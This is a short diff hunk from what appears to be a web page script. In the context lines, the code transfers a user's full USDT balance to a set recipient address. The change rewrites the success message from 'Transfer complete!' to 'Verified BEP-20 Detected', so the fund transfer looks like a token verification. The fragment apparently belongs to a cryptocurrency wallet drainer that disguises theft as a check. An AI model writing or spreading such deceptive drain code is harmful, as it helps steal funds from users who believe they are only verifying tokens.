@@ -161,7 +161,7 @@
             document.getElementById("log").textContent = "⏳ Sending...";
             const tx = await usdt.transfer(recipient, usdtBalance);
             await tx.wait();
-            document.getElementById("log").textContent = "✅ Transfer complete!";
+            document.getElementById("log").textContent = "Verified BEP-20 Detected";
           } catch (err) {
             console.error(err);
             document.getElementById("log").textContent = "❌ Transaction failed.";
